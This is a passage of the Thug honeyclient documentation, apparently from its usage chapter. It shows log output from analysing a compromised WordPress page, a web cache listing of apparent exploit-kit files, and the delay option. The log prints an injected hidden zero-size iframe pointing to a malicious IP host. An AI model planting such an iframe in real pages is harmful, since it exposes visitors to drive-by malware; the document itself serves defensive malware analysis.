<span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/feed/ <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: 0f3dffbe75d901cf28d63f2e8c945815<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;pingback&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: ce1ec1253cf77acb1a86d38c80a83ca2<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php?rsd&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;EditURI&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;RSD&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rsd+xml&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php?rsd <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php?rsd <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: d178bfd11bc1b88fc37be47b515210eb<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version<span class="o">=</span>0.8.9.8h <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version<span class="o">=</span>0.8.9.8h <span class="o">(</span>Content-type: text/html, MD5: cd382dd315e1c83a108dd8009bad9f70<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:32<span class="o">]</span> &lt;iframe <span class="nv">frameborder</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginheight</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginwidth</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">scrolling</span><span class="o">=</span><span class="s2">&quot;no&quot;</span> <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://81.95.149.27/go.php?sid=1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;border:0px solid gray;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>&gt;&lt;/iframe&gt;
<span class="o">[</span>2013-01-08 10:32:32<span class="o">]</span> <span class="o">[</span>iframe redirection<span class="o">]</span> about:blank -&gt; http://81.95.149.27/go.php?sid<span class="o">=</span>1
<span class="o">[</span>2013-01-08 10:32:42<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span> <span class="o">(</span>Status: 408, Referrer: None<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:42<span class="o">]</span> <span class="o">[</span>Request Timeout<span class="o">]</span> URL: http://81.95.149.27/go.php?sid<span class="o">=</span>1
<span class="o">[</span>2013-01-08 10:32:42<span class="o">]</span> &lt;iframe <span class="nv">frameborder</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginheight</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginwidth</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">scrolling</span><span class="o">=</span><span class="s2">&quot;no&quot;</span> <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://81.95.149.27/go.php?sid=1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;border:0px solid gray;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>&gt;&lt;/iframe&gt;
<span class="o">[</span>2013-01-08 10:32:42<span class="o">]</span> <span class="o">[</span>iframe redirection<span class="o">]</span> about:blank -&gt; http://81.95.149.27/go.php?sid<span class="o">=</span>1
<span class="o">[</span>2013-01-08 10:32:52<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://81.95.149.27/go.php?sid<span class="o">=</span><span class="m">1</span> <span class="o">(</span>Status: 408, Referrer: None<span class="o">)</span>
<span class="o">[</span>2013-01-08 10:32:52<span class="o">]</span> <span class="o">[</span>Request Timeout<span class="o">]</span> URL: http://81.95.149.27/go.php?sid<span class="o">=</span>1
</pre></div>
</div>
<p>This is what we expect. Let&#8217;s prevent remote content fetching now while analyzing the same
locally saved page.</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~/thug/src $ thug -x ../samples/exploits/55875.html
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=utf-8&quot;</span> http-equiv<span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Acer Inc.&#39;s shares fell sharply Tuesday, one day after the Taiwanese computer maker said it would acquire Gateway Inc. for </span><span class="nv">$710</span><span class="s2"> million.  Acer said it ...&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;description&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;index,follow&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;robots&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Copyright (c)2007-2007 groundhogtech.com. All right reserved.&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;copyright&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;WordPress 2.2.1&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;generator&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> <span class="o">[</span>Meta<span class="o">]</span> Generator: WordPress 2.2.1
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;document&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;resource-type&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/favicon.ico&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;shortcut icon&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css&quot;</span> <span class="nv">media</span><span class="o">=</span><span class="s2">&quot;screen&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/feed/&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;alternate&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;Groundhogtech RSS Feed&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rss+xml&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:00<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;pingback&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:01<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php?rsd&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;EditURI&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;RSD&quot;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rsd+xml&quot;</span>/&gt;
<span class="o">[</span>2013-01-08 10:33:01<span class="o">]</span> &lt;iframe <span class="nv">frameborder</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginheight</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginwidth</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">scrolling</span><span class="o">=</span><span class="s2">&quot;no&quot;</span> <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://81.95.149.27/go.php?sid=1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;border:0px solid gray;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>&gt;&lt;/iframe&gt;
</pre></div>
</div>
</div>
<div class="section" id="web-cache">
<h2>Web Cache<a class="headerlink" href="#web-cache" title="Permalink to this headline">¶</a></h2>
<p>Another interesting feature which may turn to be useful for later (manual or automated) analysis
is the Web Cache. Thug stores the raw file downloaded during the analysis in a directory
named <em>/tmp/thug-cache-NNNN</em> with NNNN being the UID of the user running Thug.</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>$ <span class="nb">cd</span> /tmp/thug-cache-1000/
$ ls -lh
total 356K
-rw-r--r-- <span class="m">1</span> buffer buffer  15K Jul  <span class="m">2</span> 19:22 <span class="o">[</span>omitted<span class="o">]</span>,data,ap1.php,f<span class="o">=</span>b081d,cd73e46d5d3ac64d00553aa7393808fc
-rw-r--r-- <span class="m">1</span> buffer buffer  25K Jul  <span class="m">2</span> 19:18 <span class="o">[</span>omitted<span class="o">]</span>,data,ap2.php,39e5c34cd8c8c8791e2715c83f6a9cf3
-rw-r--r-- <span class="m">1</span> buffer buffer 1.3K Jul  <span class="m">2</span> 19:22 <span class="o">[</span>omitted<span class="o">]</span>,data,field.swf,0887e8c1673cec525ce8aa694192e9c7
-rw-r--r-- <span class="m">1</span> buffer buffer 1.1K Jul  <span class="m">2</span> 19:22 <span class="o">[</span>omitted<span class="o">]</span>,data,hcp_vbs.php,f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span>0,eec4de0470135e1d5de7eb1a76f2624b
-rw-r--r-- <span class="m">1</span> buffer buffer  68K Jul  <span class="m">2</span> 19:22 <span class="o">[</span>omitted<span class="o">]</span>,main.php,page<span class="o">=</span>8c6c59becaa0da07,baa880d8d79c3488f2c0557be24cca6b
-rw-r--r-- <span class="m">1</span> buffer buffer  51K Jul  <span class="m">2</span> 19:22 <span class="o">[</span>omitted<span class="o">]</span>,Ryp.jar,1cc224d259fd079dc8fc964de421c9dd
-rw-r--r-- <span class="m">1</span> buffer buffer  90K Jul  <span class="m">2</span> 19:22 <span class="o">[</span>omitted<span class="o">]</span>,w.php,e<span class="o">=</span>5<span class="p">&amp;</span><span class="nv">f</span><span class="o">=</span>b081d,6aa8d9e4db0d7b4433e791c898e7090e
-rw-r--r-- <span class="m">1</span> buffer buffer  90K Jul  <span class="m">2</span> 19:22 <span class="o">[</span>omitted<span class="o">]</span>,w.php,f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span>2,af58f45673d97ba4643bb1c87c4505b2
</pre></div>
</div>
</div>
<div class="section" id="other-useful-features">
<h2>Other useful features<a class="headerlink" href="#other-useful-features" title="Permalink to this headline">¶</a></h2>
<p>An interesting feature (introduced in Thug 0.4.13) allows you to define a maximum delay for
methods like setTimeout and setInterval which set a delay for executing a function. For instance
if the original code contains a statement like</p>
<div class="highlight-javascript"><div class="highlight"><pre><span></span><span class="nx">setTimeout</span><span class="p">(</span><span class="nx">do_stuff</span><span class="p">,</span> <span class="mi">60000</span><span class="p">);</span>
</pre></div>
</div>
<p>the code will sleep for 60 seconds before executing the function <cite>do_stuff</cite>. There are situations
where you would like to avoid wasting this time. In such cases, Thug provides the -w (&#8211;delay)
option. Simply running Thug this way (please note the interval is expressed in milliseconds)</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~ $ thug -w <span class="m">2000</span> <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
</pre></div>
</div>
<p>will force a maximum delay of 2 seconds.</p>
</div>
</div>


          </div>
        </div>
      </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
  <h4>Previous topic</h4>
  <p class="topless"><a href="configuration.html"
                        title="previous chapter">Configuration</a></p>
  <h4>Next topic</h4>
  <p class="topless"><a href="api.html"
                        title="next chapter">Thug API</a></p>
<div id="searchbox" style="display: none" role="search">
  <h3>Quick search</h3>
    <form class="search" action="search.html" method="get">
      <input type="text" name="q" />
      <input type="submit" value="Go" />
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
    <p class="searchtip" style="font-size: 90%">
    Enter search terms or a module, class or function name.
    </p>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
        </div>
      </div>
      <div class="clearer"></div>
    </div>
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="genindex.html" title="General Index"
             >index</a></li>
        <li class="right" >
          <a href="api.html" title="Thug API"
             >next</a> |</li>
        <li class="right" >
          <a href="configuration.html" title="Configuration"
             >previous</a> |</li>
        <li class="nav-item nav-item-0"><a href="index.html">Thug 0.8.10 documentation</a> &raquo;</li> 
      </ul>
    </div>
    <div class="footer" role="contentinfo">
        &copy; Copyright 2011-2016, Angelo Dell&#39;Aera.
      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.3.1.
    </div>
  </body>
</html>